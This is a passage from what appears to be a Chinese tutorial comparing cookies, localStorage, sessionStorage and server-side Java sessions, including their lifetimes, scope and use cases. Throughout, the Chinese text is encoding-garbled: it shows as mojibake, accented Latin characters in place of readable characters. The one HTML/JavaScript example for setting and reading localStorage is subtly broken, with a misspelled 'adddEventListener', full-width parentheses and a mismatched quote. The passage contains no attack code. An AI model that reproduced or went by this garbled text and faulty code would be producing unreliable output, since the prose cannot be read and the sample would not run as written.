çš„Cookieåªåº”é€šè¿‡è¢«HTTPSåè®®åŠ å¯†è¿‡çš„è¯·æ±‚å‘é€ç»™æœåŠ¡ç«¯ã€‚ä½†å³ä¾¿è®¾ç½®äº† Secure æ ‡è®°ï¼Œæ•æ„Ÿä¿¡æ¯ä¹Ÿä¸åº”è¯¥é€šè¿‡Cookieä¼ è¾“ï¼Œå› ä¸ºCookieæœ‰å…¶å›ºæœ‰çš„ä¸å®‰å…¨æ€§ï¼ŒSecure æ ‡è®°ä¹Ÿæ— æ³•æä¾›ç¡®å®žçš„å®‰å…¨ä¿éšœã€‚ ä¸ºäº†å¼¥è¡¥ Cookie çš„å±€é™æ€§ï¼Œè®©â€œä¸“ä¸šçš„äººåšä¸“ä¸šçš„äº‹æƒ…â€ï¼ŒWeb Storage å‡ºçŽ°äº†ã€‚ HTML5ä¸­æ–°å¢žäº†æœ¬åœ°å­˜å‚¨çš„è§£å†³æ–¹æ¡ˆâ€”-Web Storageï¼Œå®ƒåˆ†æˆä¸¤ç±»ï¼šsessionStorageå’ŒlocalStorageã€‚è¿™æ ·æœ‰äº†WebStorageåŽï¼Œcookieèƒ½åªåšå®ƒåº”è¯¥åšçš„äº‹æƒ…äº†â€”â€”ä½œä¸ºå®¢æˆ·ç«¯ä¸ŽæœåŠ¡å™¨äº¤äº’çš„é€šé“ï¼Œä¿æŒå®¢æˆ·ç«¯çŠ¶æ€ã€‚ LocalStorage æ˜¯ä¸€ç§æœ¬åœ°å­˜å‚¨çš„å…¬å…±èµ„æºï¼ŒåŸŸåä¸‹å¾ˆå¤šåº”ç”¨å…±äº«è¿™ä»½èµ„æºä¼šæœ‰é£Žé™©ï¼›LocalStorage æ˜¯ä»¥é¡µé¢åŸŸååˆ’åˆ†çš„ï¼Œå¦‚æžœæœ‰å¤šä¸ªç­‰ä»·åŸŸåä¹‹é—´çš„ LocalStorage ä¸äº’é€šï¼Œåˆ™ä¼šé€ æˆç¼“å­˜å¤šä»½æµªè´¹ã€‚ LocalStorage åœ¨ PC ä¸Šçš„å…¼å®¹æ€§ä¸å¤ªå¥½ï¼Œè€Œä¸”å½“ç½‘ç»œé€Ÿåº¦å¿«ã€åå•†ç¼“å­˜å“åº”å¿«æ—¶ä½¿ç”¨ localStorage çš„é€Ÿåº¦æ¯”ä¸ä¸Š 304ã€‚å¹¶ä¸”ä¸èƒ½ç¼“å­˜ css æ–‡ä»¶ã€‚è€Œç§»åŠ¨ç«¯ç”±äºŽç½‘é€Ÿæ…¢ï¼Œä½¿ç”¨ localStorage è¦å¿«äºŽ 304ã€‚ è€Œç›¸å¯¹ LocalStorage æ¥è¯´ï¼ŒSessionStorage çš„æ•°æ®åªå­˜å‚¨åˆ°ç‰¹å®šçš„ä¼šè¯ä¸­ï¼Œä¸å±žäºŽæŒä¹…åŒ–çš„å­˜å‚¨ï¼Œæ‰€ä»¥å…³é—­æµè§ˆå™¨ä¼šæ¸…é™¤æ•°æ®ã€‚å’Œ localstorage å…·æœ‰ç›¸åŒçš„æ–¹æ³•ã€‚ äºŒã€Web Storage APIåœ¨HTML5ä¸­æ·»åŠ çš„åœ¨æœ¬åœ°å­˜å‚¨æ•°æ®çš„æ–°é€‰é¡¹ï¼Œä»Žcookieç”¨äºŽä¿å­˜å®¢æˆ·ç«¯ä¸ŽæœåŠ¡å™¨é€šä¿¡ï¼Œä½†Web Storage APIç”¨äºŽä¿å­˜æ¯”cookieæ›´å¤§çš„å®¢æˆ·ç«¯æ•°æ® 1ï¼‰LocalStorage1. LocalStorageçš„ç‰¹ç‚¹ ä¿å­˜çš„æ•°æ®é•¿æœŸå­˜åœ¨ï¼Œä¸‹ä¸€æ¬¡è®¿é—®è¯¥ç½‘ç«™çš„æ—¶å€™ï¼Œç½‘é¡µå¯ä»¥ç›´æŽ¥è¯»å–ä»¥å‰ä¿å­˜çš„æ•°æ®ã€‚ å¤§å°ä¸º5Må·¦å³ ä»…åœ¨å®¢æˆ·ç«¯ä½¿ç”¨ï¼Œä¸å’ŒæœåŠ¡ç«¯è¿›è¡Œé€šä¿¡ æŽ¥å£å°è£…è¾ƒå¥½ å¤šé€‰é¡¹å¡ä¹‹é—´åŒæ­¥æ•°æ® åŸºäºŽä¸Šé¢çš„ç‰¹ç‚¹ï¼ŒLocalStorageå¯ä»¥ä½œä¸ºæµè§ˆå™¨æœ¬åœ°ç¼“å­˜æ–¹æ¡ˆï¼Œç”¨æ¥æå‡ç½‘é¡µé¦–å±æ¸²æŸ“é€Ÿåº¦(æ ¹æ®ç¬¬ä¸€è¯·æ±‚è¿”å›žæ—¶ï¼Œå°†ä¸€äº›ä¸å˜ä¿¡æ¯ç›´æŽ¥å­˜å‚¨åœ¨æœ¬åœ°)ã€‚ 2.å­˜å…¥/è¯»å–æ•°æ®localStorageä¿å­˜çš„æ•°æ®ï¼Œä»¥â€œé”®å€¼å¯¹â€çš„å½¢å¼å­˜åœ¨ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯ä¸€é¡¹æ•°æ®éƒ½æœ‰ä¸€ä¸ªé”®åå’Œå¯¹åº”çš„å€¼ã€‚æ‰€æœ‰çš„æ•°æ®éƒ½æ˜¯ä»¥æ–‡æœ¬æ ¼å¼ä¿å­˜ã€‚ å­˜å…¥æ•°æ®ä½¿ç”¨setItemæ–¹æ³•ã€‚å®ƒæŽ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯é”®åï¼Œç¬¬äºŒä¸ªæ˜¯ä¿å­˜çš„æ•°æ®ã€‚ 1localStorage.setItem("key","value"); è¯»å–æ•°æ®ä½¿ç”¨getItemæ–¹æ³•ã€‚å®ƒåªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œå°±æ˜¯é”®åã€‚ 1var valueLocal = localStorage.getItem("key"); å…·ä½“æ­¥éª¤ï¼Œè¯·çœ‹ä¸‹é¢çš„ä¾‹å­ï¼š 1234567891011121314151617181920212223&lt;script&gt; if(window.localStorage)&#123; localStorage.setItemï¼ˆ'name','world'ï¼‰ localStorage.setItemï¼ˆâ€œgender','famale'ï¼‰ &#125;&lt;/script&gt;&lt;body&gt; &lt;div id="name"&gt;&lt;/div&gt; &lt;div id="gender"&gt;&lt;/div&gt; &lt;script&gt; var name = localStorage.getItem("name"); var gender = localStorage.getItem("gender"); document.getElementById("name").innerHTML = name; document.getElementById("gender").innerHTML = gender; &lt;/script&gt;&lt;/body&gt;&lt;script&gt; window.adddEventListener('storage',()=&gt;&#123; console.log('local storage has been updated') &#125;) //æ”¯æŒåº¦å¯èƒ½ä¸å¤Ÿ&lt;/script&gt; 3. ä½¿ç”¨åœºæ™¯LocalStorageåœ¨å­˜å‚¨æ–¹é¢æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„é™åˆ¶ï¼Œç†è®ºä¸Š Cookie æ— æ³•èƒœä»»çš„ã€å¯ä»¥ç”¨ç®€å•çš„é”®å€¼å¯¹æ¥å­˜å–çš„æ•°æ®å­˜å‚¨ä»»åŠ¡ï¼Œéƒ½å¯ä»¥äº¤ç»™ LocalStorage æ¥åšã€‚ è¿™é‡Œç»™å¤§å®¶ä¸¾ä¸ªä¾‹å­ï¼Œè€ƒè™‘åˆ° LocalStorage çš„ç‰¹ç‚¹ä¹‹ä¸€æ˜¯æŒä¹…ï¼Œæœ‰æ—¶æˆ‘ä»¬æ›´å€¾å‘äºŽç”¨å®ƒæ¥å­˜å‚¨ä¸€äº›å†…å®¹ç¨³å®šçš„èµ„æºã€‚æ¯”å¦‚å›¾ç‰‡å†…å®¹ä¸°å¯Œçš„ç”µå•†ç½‘ç«™ä¼šç”¨å®ƒæ¥å­˜å‚¨ Base64 æ ¼å¼çš„å›¾ç‰‡å­—ç¬¦ä¸²ï¼š é™¤éžé€‚åº”localStorage.removeItem(â€˜keyâ€™)åˆ é™¤å•ä¸ªé”®å€¼å¯¹ï¼Œæˆ–localStorage.clear()æ¸…é™¤æ‰€æœ‰æ•°æ® 2ï¼‰sessionStoragesessionStorageä¿å­˜çš„æ•°æ®ç”¨äºŽæµè§ˆå™¨çš„ä¸€æ¬¡ä¼šè¯ï¼Œå½“ä¼šè¯ç»“æŸï¼ˆé€šå¸¸æ˜¯è¯¥çª—å£å…³é—­ï¼‰ï¼Œæ•°æ®è¢«æ¸…ç©ºï¼›sessionStorage ç‰¹åˆ«çš„ä¸€ç‚¹åœ¨äºŽï¼Œå³ä¾¿æ˜¯ç›¸åŒåŸŸåä¸‹çš„ä¸¤ä¸ªé¡µé¢ï¼Œåªè¦å®ƒä»¬ä¸åœ¨åŒä¸€ä¸ªæµè§ˆå™¨çª—å£ä¸­æ‰“å¼€ï¼Œé‚£ä¹ˆå®ƒä»¬çš„ sessionStorage å†…å®¹ä¾¿æ— æ³•å…±äº«ï¼›localStorage åœ¨æ‰€æœ‰åŒæºçª—å£ä¸­éƒ½æ˜¯å…±äº«çš„ï¼›cookieä¹Ÿæ˜¯åœ¨æ‰€æœ‰åŒæºçª—å£ä¸­éƒ½æ˜¯å…±äº«çš„ã€‚é™¤äº†ä¿å­˜æœŸé™çš„é•¿çŸ­ä¸åŒï¼ŒSessionStorageçš„å±žæ€§å’Œæ–¹æ³•ä¸ŽLocalStorageå®Œå…¨ä¸€æ ·ã€‚ 1.sessionStorageçš„ç‰¹ç‚¹ ä¼šè¯çº§åˆ«çš„æµè§ˆå™¨å­˜å‚¨ å¤§å°ä¸º5Må·¦å³ ä»…åœ¨å®¢æˆ·ç«¯ä½¿ç”¨ï¼Œä¸å’ŒæœåŠ¡ç«¯è¿›è¡Œé€šä¿¡ æŽ¥å£å°è£…è¾ƒå¥½ åŸºäºŽä¸Šé¢çš„ç‰¹ç‚¹ï¼ŒsessionStorage å¯ä»¥æœ‰æ•ˆå¯¹è¡¨å•ä¿¡æ¯è¿›è¡Œç»´æŠ¤ï¼Œæ¯”å¦‚åˆ·æ–°æ—¶ï¼Œè¡¨å•ä¿¡æ¯ä¸ä¸¢å¤±ã€‚ 2. ä½¿ç”¨åœºæ™¯sessionStorage æ›´é€‚åˆç”¨æ¥å­˜å‚¨ç”Ÿå‘½å‘¨æœŸå’Œå®ƒåŒæ­¥çš„ä¼šè¯çº§åˆ«çš„ä¿¡æ¯ã€‚è¿™äº›ä¿¡æ¯åªé€‚ç”¨äºŽå½“å‰ä¼šè¯ï¼Œå½“ä½ å¼€å¯æ–°çš„ä¼šè¯æ—¶ï¼Œå®ƒä¹Ÿéœ€è¦ç›¸åº”çš„æ›´æ–°æˆ–é‡Šæ”¾ã€‚æ¯”å¦‚å¾®åšçš„ sessionStorageå°±ä¸»è¦æ˜¯å­˜å‚¨ä½ æœ¬æ¬¡ä¼šè¯çš„æµè§ˆè¶³è¿¹ï¼š lasturl å¯¹åº”çš„å°±æ˜¯ä½ ä¸Šä¸€æ¬¡è®¿é—®çš„ URL åœ°å€ï¼Œè¿™ä¸ªåœ°å€æ˜¯å³æ—¶çš„ã€‚å½“ä½ åˆ‡æ¢ URL æ—¶ï¼Œå®ƒéšä¹‹æ›´æ–°ï¼Œå½“ä½ å…³é—­é¡µé¢æ—¶ï¼Œç•™ç€å®ƒä¹Ÿç¡®å®žæ²¡æœ‰ä»€ä¹ˆæ„ä¹‰äº†ï¼Œå¹²è„†é‡Šæ”¾å§ã€‚è¿™æ ·çš„æ•°æ®ç”¨ sessionStorage æ¥å¤„ç†å†åˆé€‚ä¸è¿‡ã€‚ 3.sessionStorage ã€localStorage å’Œ cookie ä¹‹é—´çš„åŒºåˆ« å…±åŒç‚¹ï¼šéƒ½æ˜¯ä¿å­˜åœ¨æµè§ˆå™¨ç«¯ï¼Œä¸”éƒ½éµå¾ªåŒæºç­–ç•¥ã€‚ ä¸åŒç‚¹ï¼šåœ¨äºŽç”Ÿå‘½å‘¨æœŸä¸Žä½œç”¨åŸŸçš„ä¸åŒ ä½œç”¨åŸŸï¼šlocalStorageåªè¦åœ¨ç›¸åŒçš„åè®®ã€ç›¸åŒçš„ä¸»æœºåã€ç›¸åŒçš„ç«¯å£ä¸‹ï¼Œå°±èƒ½è¯»å–/ä¿®æ”¹åˆ°åŒä¸€ä»½localStorageæ•°æ®ã€‚sessionStorageæ¯”localStorageæ›´ä¸¥è‹›ä¸€ç‚¹ï¼Œé™¤äº†åè®®ã€ä¸»æœºåã€ç«¯å£å¤–ï¼Œè¿˜è¦æ±‚åœ¨åŒä¸€çª—å£ï¼ˆä¹Ÿå°±æ˜¯æµè§ˆå™¨çš„æ ‡ç­¾é¡µï¼‰ä¸‹ ç”Ÿå‘½å‘¨æœŸï¼šlocalStorage æ˜¯æŒä¹…åŒ–çš„æœ¬åœ°å­˜å‚¨ï¼Œå­˜å‚¨åœ¨å…¶ä¸­çš„æ•°æ®æ˜¯æ°¸è¿œä¸ä¼šè¿‡æœŸçš„ï¼Œä½¿å…¶æ¶ˆå¤±çš„å”¯ä¸€åŠžæ³•æ˜¯æ‰‹åŠ¨åˆ é™¤ï¼›è€Œ sessionStorage æ˜¯ä¸´æ—¶æ€§çš„æœ¬åœ°å­˜å‚¨ï¼Œå®ƒæ˜¯ä¼šè¯çº§åˆ«çš„å­˜å‚¨ï¼Œå½“ä¼šè¯ç»“æŸï¼ˆé¡µé¢è¢«å…³é—­ï¼‰æ—¶ï¼Œå­˜å‚¨å†…å®¹ä¹Ÿéšä¹‹è¢«é‡Šæ”¾ã€‚ Web Storage æ˜¯ä¸€ä¸ªä»Žå®šä¹‰åˆ°ä½¿ç”¨éƒ½éžå¸¸ç®€å•çš„ä¸œè¥¿ã€‚å®ƒä½¿ç”¨é”®å€¼å¯¹çš„å½¢å¼è¿›è¡Œå­˜å‚¨ï¼Œè¿™ç§æ¨¡å¼æœ‰ç‚¹ç±»ä¼¼äºŽå¯¹è±¡ï¼Œå´ç”šè‡³è¿žå¯¹è±¡éƒ½ä¸æ˜¯â€”â€”å®ƒåªèƒ½å­˜å‚¨å­—ç¬¦ä¸²ï¼Œè¦æƒ³å¾—åˆ°å¯¹è±¡ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å…ˆå¯¹å­—ç¬¦ä¸²è¿›è¡Œä¸€è½®è§£æžã€‚ è¯´åˆ°åº•ï¼ŒWeb Storage æ˜¯å¯¹ Cookie çš„æ‹“å±•ï¼Œå®ƒåªèƒ½ç”¨äºŽå­˜å‚¨å°‘é‡çš„ç®€å•æ•°æ®ã€‚å½“é‡åˆ°å¤§è§„æ¨¡çš„ã€ç»“æž„å¤æ‚çš„æ•°æ®æ—¶ï¼ŒWeb Storage ä¹Ÿçˆ±èŽ«èƒ½åŠ©äº†ã€‚è¿™æ—¶å€™æˆ‘ä»¬å°±è¦æ¸…æ¥šæˆ‘ä»¬çš„ç»ˆæžå¤§ bossâ€”â€”IndexedDBï¼ å››ã€Sessionä¼šè¯ï¼ŒæœåŠ¡å™¨å°±è¦ç»™æ¯ä¸ªå®¢æˆ·ç«¯åˆ†é…ä¸åŒçš„â€œèº«ä»½æ ‡è¯†â€ã€‚ Sessionæ˜¯ä¸€ç§è®°å½•å®¢æˆ·çŠ¶æ€çš„æœºåˆ¶ï¼Œä¸åŒäºŽCookieçš„æ˜¯Cookieä¿å­˜åœ¨å®¢æˆ·ç«¯æµè§ˆå™¨ä¸­ï¼Œè€ŒSessionä¿å­˜åœ¨æœåŠ¡å™¨ä¸Šã€‚ å®¢æˆ·ç«¯æµè§ˆå™¨è®¿é—®æœåŠ¡å™¨çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨æŠŠå®¢æˆ·ç«¯ä¿¡æ¯ä»¥æŸç§å½¢å¼è®°å½•åœ¨æœåŠ¡å™¨ä¸Šã€‚è¿™å°±æ˜¯Sessionã€‚ å®¢æˆ·ç«¯æµè§ˆå™¨å†æ¬¡è®¿é—®æ—¶åªéœ€è¦ä»Žè¯¥Sessionä¸­æŸ¥æ‰¾è¯¥å®¢æˆ·çš„çŠ¶æ€å°±å¯ä»¥äº†ã€‚ å¦‚æžœè¯´Cookieæœºåˆ¶æ˜¯é€šè¿‡æ£€æŸ¥å®¢æˆ·èº«ä¸Šçš„â€é€šè¡Œè¯â€æ¥ç¡®å®šå®¢æˆ·èº«ä»½çš„è¯ï¼Œ é‚£ä¹ˆSessionæœºåˆ¶å°±æ˜¯é€šè¿‡æ£€æŸ¥æœåŠ¡å™¨ä¸Šçš„â€å®¢æˆ·æ˜Žç»†è¡¨â€æ¥ç¡®è®¤å®¢æˆ·èº«ä»½ã€‚ Sessionç›¸å½“äºŽç¨‹åºåœ¨æœåŠ¡å™¨ä¸Šå»ºç«‹çš„ä¸€ä»½å®¢æˆ·æ¡£æ¡ˆï¼Œ å®¢æˆ·æ¥è®¿çš„æ—¶å€™åªéœ€è¦æŸ¥è¯¢å®¢æˆ·æ¡£æ¡ˆè¡¨å°±å¯ä»¥äº†ã€‚ æœåŠ¡å™¨ä½¿ç”¨sessionæŠŠç”¨æˆ·çš„ä¿¡æ¯ä¸´æ—¶ä¿å­˜åœ¨äº†æœåŠ¡å™¨ä¸Šï¼Œç”¨æˆ·ç¦»å¼€ç½‘ç«™åŽsessionä¼šè¢«é”€æ¯ã€‚è¿™ç§ç”¨æˆ·ä¿¡æ¯å­˜å‚¨æ–¹å¼ç›¸å¯¹cookieæ¥è¯´æ›´å®‰å…¨ï¼Œå¯æ˜¯sessionæœ‰ä¸€ä¸ªç¼ºé™·ï¼šå¦‚æžœwebæœåŠ¡å™¨åšäº†è´Ÿè½½å‡è¡¡ï¼Œé‚£ä¹ˆä¸‹ä¸€ä¸ªæ“ä½œè¯·æ±‚åˆ°äº†å¦ä¸€å°æœåŠ¡å™¨çš„æ—¶å€™sessionä¼šä¸¢å¤±ã€‚ Sessionæœºåˆ¶ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå®¢æˆ·ç«¯æµè§ˆå™¨ä¸ŽæœåŠ¡å™¨ä¹‹é—´ä¸€ç³»åˆ—äº¤äº’çš„åŠ¨ä½œç§°ä¸ºä¸€ä¸ª Sessionã€‚ ä»Žè¿™ä¸ªè¯­ä¹‰å‡ºå‘ï¼Œæˆ‘ä»¬ä¼šæåˆ°SessionæŒç»­çš„æ—¶é—´ï¼Œä¼šæåˆ°åœ¨Sessionè¿‡ç¨‹ä¸­è¿›è¡Œäº†ä»€ä¹ˆæ“ä½œç­‰ç­‰ã€‚ å¦ä¸€æ–¹é¢ï¼ŒSessionæŒ‡çš„æ˜¯æœåŠ¡å™¨ç«¯ä¸ºå®¢æˆ·ç«¯æ‰€å¼€è¾Ÿçš„å­˜å‚¨ç©ºé—´ï¼Œè¯¥ç©ºé—´ä¿å­˜çš„ä¿¡æ¯å°±æ˜¯ç”¨äºŽä¿æŒçŠ¶æ€ã€‚ ä»Žè¿™ä¸ªè¯­ä¹‰å‡ºå‘ï¼Œæˆ‘ä»¬åˆ™ä¼šæåˆ°å¾€Sessionä¸­å­˜æ”¾ä»€ä¹ˆå†…å®¹ï¼Œå¦‚ä½•æ ¹æ®é”®å€¼ä»ŽSessionä¸­èŽ·å–åŒ¹é…çš„å†…å®¹ç­‰ã€‚ è¦ä½¿ç”¨Sessionï¼Œå½“ç„¶æ˜¯å…ˆè¦åˆ›å»ºSessionã€‚é‚£ä¹ˆSessionåœ¨ä½•æ—¶åˆ›å»ºå‘¢ï¼Ÿ Sessionåœ¨æœåŠ¡å™¨ç«¯ç¨‹åºè¿è¡Œçš„è¿‡ç¨‹ä¸­åˆ›å»ºçš„ï¼Œä¸åŒè¯­è¨€å®žçŽ°çš„åº”ç”¨ç¨‹åºæœ‰ä¸åŒåˆ›å»ºSessionçš„æ–¹æ³•ï¼Œ åœ¨Javaä¸­æ˜¯é€šè¿‡è°ƒç”¨HttpServletRequestçš„getSessionæ–¹æ³•(ä½¿ç”¨trueä½œä¸ºå‚æ•°)åˆ›å»ºçš„ã€‚ åˆ›å»ºSessionçš„åŒæ—¶ï¼ŒæœåŠ¡å™¨ä¼šä¸ºè¯¥Sessionç”Ÿæˆå”¯ä¸€çš„session idï¼Œ è¿™ä¸ªsession idåœ¨éšåŽçš„è¯·æ±‚ä¸­ä¼šè¢«ç”¨æ¥é‡æ–°èŽ·å¾—å·²ç»åˆ›å»ºçš„Session Sessionè¢«åˆ›å»ºä¹‹åŽï¼Œå°±å¯ä»¥è°ƒç”¨Sessionç›¸å…³çš„æ–¹æ³•å¾€Sessionä¸­å¢žåŠ å†…å®¹äº†ï¼Œ è€Œè¿™äº›å†…å®¹åªä¼šä¿å­˜åœ¨æœåŠ¡å™¨ä¸­ï¼Œå‘åˆ°å®¢æˆ·ç«¯çš„åªæœ‰session id å½“å®¢æˆ·ç«¯å†æ¬¡å‘é€è¯·æ±‚çš„æ—¶å€™ï¼Œä¼šå°†è¿™ä¸ªsession idå¸¦ä¸Šï¼Œ æœåŠ¡å™¨æŽ¥å—åˆ°è¯·æ±‚ä¹‹åŽå°±ä¼šä¾æ®session idæ‰¾åˆ°ç›¸åº”çš„Sessionï¼Œä»Žè€Œå†æ¬¡ä½¿ç”¨Sessionã€‚ Sessionçš„ç”Ÿå‘½å‘¨æœŸSessionä¿å­˜åœ¨æœåŠ¡å™¨ç«¯ã€‚ä¸ºäº†èŽ·å¾—æ›´é«˜çš„å­˜å–é€Ÿåº¦ï¼ŒæœåŠ¡å™¨ä¸€èˆ¬æŠŠSessionæ”¾åœ¨å†…å­˜ä¸­ã€‚ æ¯ä¸ªç”¨æˆ·éƒ½ä¼šæœ‰ä¸€ä¸ªç‹¬ç«‹çš„Sessionã€‚ å¦‚æžœSessionå†…å®¹è¿‡äºŽå¤æ‚ï¼Œå½“å¤§é‡å®¢æˆ·è®¿é—®æœåŠ¡å™¨æ—¶å¯èƒ½ä¼šå¯¼è‡´å†…å­˜æº¢å‡ºã€‚ å› æ­¤ï¼ŒSessioné‡Œçš„ä¿¡æ¯åº”è¯¥å°½é‡ç²¾ç®€ã€‚ Sessionåœ¨ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®æœåŠ¡å™¨çš„æ—¶å€™è‡ªåŠ¨åˆ›å»ºã€‚ éœ€è¦æ³¨æ„åªæœ‰è®¿é—®JSPã€Servletç­‰ç¨‹åºæ—¶æ‰ä¼šåˆ›å»ºSessionï¼Œ åªè®¿é—®HTMLã€IMAGEç­‰é™æ€èµ„æºå¹¶ä¸ä¼šåˆ›å»ºSessionã€‚ å¦‚æžœå°šæœªç”ŸæˆSessionï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨request.getSession(true)å¼ºåˆ¶ç”ŸæˆSessionã€‚ Sessionç”ŸæˆåŽï¼Œåªè¦ç”¨æˆ·ç»§ç»­è®¿é—®ï¼ŒæœåŠ¡å™¨å°±ä¼šæ›´æ–°Sessionçš„æœ€åŽè®¿é—®æ—¶é—´ï¼Œå¹¶ç»´æŠ¤è¯¥Sessionã€‚ ç”¨æˆ·æ¯è®¿é—®æœåŠ¡å™¨ä¸€æ¬¡ï¼Œæ— è®ºæ˜¯å¦è¯»å†™Sessionï¼ŒæœåŠ¡å™¨éƒ½è®¤ä¸ºè¯¥ç”¨æˆ·çš„Sessionâ€æ´»è·ƒ(active)â€äº†ä¸€æ¬¡ã€‚ 1sessionçš„ç”Ÿå‘½å‘¨æœŸå½“ä¸€ä¸ªSessionå¼€å§‹æ—¶ï¼ŒServletå®¹å™¨ä¼šåˆ›å»ºä¸€ä¸ªHttpSessionå¯¹è±¡ï¼Œé‚£ä¹ˆåœ¨HttpSessionå¯¹è±¡ä¸­ï¼Œå¯ä»¥å­˜æ”¾ç”¨æˆ·çŠ¶æ€çš„ä¿¡æ¯ã€‚Servletå®¹å™¨ä¸ºHttpSessionå¯¹è±¡åˆ†é…ä¸€ä¸ªå”¯ä¸€æ ‡è¯†ç¬¦å³Sessionidï¼ŒServletå®¹å™¨æŠŠSessionidä½œä¸ºä¸€ç§Cookieä¿å­˜åœ¨å®¢æˆ·ç«¯çš„ *æµè§ˆå™¨* ä¸­ã€‚ â€‹ ç”¨æˆ·æ¯æ¬¡å‘å‡ºHttpè¯·æ±‚æ—¶ï¼ŒServletå®¹å™¨ä¼šä»ŽHttpServletRequestå¯¹è±¡ä¸­å–å‡ºSessionid,ç„¶åŽæ ¹æ®è¿™ä¸ªSessionidæ‰¾åˆ°ç›¸åº”çš„HttpSessionå¯¹è±¡ï¼Œä»Žè€ŒèŽ·å–ç”¨æˆ·çš„çŠ¶æ€ä¿¡æ¯ã€‚ æˆ‘ä»¬çŸ¥é“Sessionæ˜¯å­˜åœ¨äºŽæœåŠ¡å™¨ç«¯çš„ï¼Œå½“æŠŠæµè§ˆå™¨å…³é—­æ—¶ï¼Œæµè§ˆå™¨å¹¶æ²¡æœ‰å‘æœåŠ¡å™¨å‘é€ä»»ä½•è¯·æ±‚æ¥å…³é—­Sessionï¼Œè‡ªç„¶Sessionä¹Ÿä¸ä¼šè¢«é”€æ¯ï¼Œä½†æ˜¯å¯ä»¥åšä¸€ç‚¹åŠªåŠ›ï¼Œåœ¨æ‰€æœ‰çš„å®¢æˆ·ç«¯é¡µé¢é‡Œä½¿ç”¨jsçš„window.oncloseæ¥ç›‘è§†æµè§ˆå™¨çš„å…³é—­åŠ¨ä½œï¼Œç„¶åŽå‘æœåŠ¡å™¨å‘é€ä¸€ä¸ªè¯·æ±‚æ¥å…³é—­Sessionï¼Œä½†æ˜¯è¿™ç§åšæ³•åœ¨å®žé™…çš„å¼€å‘ä¸­ä¹Ÿæ˜¯ä¸æŽ¨èä½¿ç”¨çš„ï¼Œæœ€æ­£å¸¸çš„åŠžæ³•å°±æ˜¯ä¸åŽ»ç®¡å®ƒï¼Œè®©å®ƒç­‰åˆ°é»˜è®¤çš„æ—¶é—´åŽï¼Œè‡ªåŠ¨é”€æ¯ã€‚é‚£ä¹ˆä¸ºä»€ä¹ˆå½“æˆ‘ä»¬å…³é—­æµè§ˆå™¨åŽï¼Œå°±å†ä¹Ÿè®¿é—®ä¸åˆ°ä¹‹å‰çš„sessionäº†å‘¢ï¼Ÿå…¶å®žä¹‹å‰çš„Sessionä¸€ç›´éƒ½åœ¨æœåŠ¡å™¨ç«¯ï¼Œè€Œå½“æˆ‘ä»¬å…³é—­æµè§ˆå™¨æ—¶ï¼Œæ­¤æ—¶çš„Cookieæ˜¯å­˜åœ¨äºŽæµè§ˆå™¨çš„è¿›ç¨‹ä¸­çš„ï¼Œå½“æµè§ˆå™¨å…³é—­æ—¶ï¼ŒCookieä¹Ÿå°±ä¸å­˜åœ¨äº†ã€‚ å…¶å®žCookieæœ‰ä¸¤ç§: ä¸€ç§æ˜¯å­˜åœ¨äºŽæµè§ˆå™¨çš„è¿›ç¨‹ä¸­; ä¸€ç§æ˜¯å­˜åœ¨äºŽç¡¬ç›˜ä¸Š è€Œsessionçš„Cookieæ˜¯å­˜åœ¨äºŽæµè§ˆå™¨çš„è¿›ç¨‹ä¸­ï¼Œé‚£ä¹ˆè¿™ç§Cookieæˆ‘ä»¬ç§°ä¸ºä¼šè¯Cookieï¼Œå½“æˆ‘ä»¬é‡æ–°æ‰“å¼€æµè§ˆå™¨çª—å£æ—¶ï¼Œä¹‹å‰çš„Cookieä¸­å­˜æ”¾çš„Sessionidå·²ç»ä¸å­˜åœ¨äº†ï¼Œæ­¤æ—¶æœåŠ¡å™¨ä»ŽHttpServletRequestå¯¹è±¡ä¸­æ²¡æœ‰æ£€æŸ¥åˆ°sessionidï¼ŒæœåŠ¡å™¨ä¼šå†å‘é€ä¸€ä¸ªæ–°çš„å­˜æœ‰Sessionidçš„Cookieåˆ°å®¢æˆ·ç«¯çš„æµè§ˆå™¨ä¸­ï¼Œæ­¤æ—¶å¯¹åº”çš„æ˜¯ä¸€ä¸ªæ–°çš„ä¼šè¯ï¼Œè€ŒæœåŠ¡å™¨ä¸ŠåŽŸå…ˆçš„sessionç­‰åˆ°å®ƒçš„é»˜è®¤æ—¶é—´åˆ°ä¹‹åŽï¼Œä¾¿ä¼šè‡ªåŠ¨é”€æ¯ã€‚ å½“åœ¨åŒä¸€ä¸ªæµè§ˆå™¨ä¸­åŒæ—¶æ‰“å¼€å¤šä¸ªæ ‡ç­¾ï¼Œå‘é€åŒä¸€ä¸ªè¯·æ±‚æˆ–ä¸åŒçš„è¯·æ±‚ï¼Œä»æ˜¯åŒä¸€ä¸ªsession; â€‹ å½“ä¸åœ¨åŒä¸€ä¸ªçª—å£ä¸­æ‰“å¼€ç›¸åŒçš„æµè§ˆå™¨æ—¶ï¼Œå‘é€è¯·æ±‚ï¼Œä»æ˜¯åŒä¸€ä¸ªsession; â€‹ å½“ä½¿ç”¨ä¸åŒçš„æµè§ˆå™¨æ—¶ï¼Œå‘é€è¯·æ±‚ï¼Œå³ä½¿å‘é€ç›¸åŒçš„è¯·æ±‚ï¼Œæ˜¯ä¸åŒçš„session; â€‹ å½“æŠŠå½“å‰æŸä¸ªæµè§ˆå™¨çš„çª—å£å…¨å…³é—­ï¼Œå†æ‰“å¼€ï¼Œå‘èµ·ç›¸åŒçš„è¯·æ±‚æ—¶ï¼Œå°±æ˜¯æœ¬æ–‡æ‰€é˜è¿°çš„ï¼Œæ˜¯ä¸åŒçš„session,ä½†æ˜¯å®ƒå’Œsessionçš„ç”Ÿå‘½å‘¨æœŸæ˜¯æ²¡æœ‰å…³ç³»çš„. Sessionçš„æœ‰æ•ˆæœŸç”±äºŽä¼šæœ‰è¶Šæ¥è¶Šå¤šçš„ç”¨æˆ·è®¿é—®æœåŠ¡å™¨ï¼Œå› æ­¤Sessionä¹Ÿä¼šè¶Šæ¥è¶Šå¤šã€‚ 